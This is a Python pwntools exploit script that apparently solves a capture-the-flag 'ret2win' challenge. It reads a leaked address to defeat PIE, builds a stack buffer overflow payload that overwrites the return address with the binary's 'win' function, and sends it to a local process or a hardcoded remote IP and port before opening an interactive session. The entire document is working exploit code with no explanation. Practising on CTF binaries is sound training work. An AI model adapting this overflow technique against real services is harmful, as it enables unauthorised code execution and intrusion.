#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./ret2win", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc 103.185.44.122 19003"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        args_ = [elf.path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        return process(args_, env=env, *a, **kw)


env = {}
io = start()

io.recvuntil(b"you: ")
pie_leak = int(io.recvline(), 16)
elf.address = pie_leak - 0x404c
log.info(f"{elf.address=:#x}")

assert (elf.address & 0xfff == 0)

ret = elf.address + 0x00001360
payload = b"A" * 0x70
payload += flat(
    elf.bss(0xc00),
    ret,
    elf.sym["win"],
)

io.sendline(payload)

io.interactive()
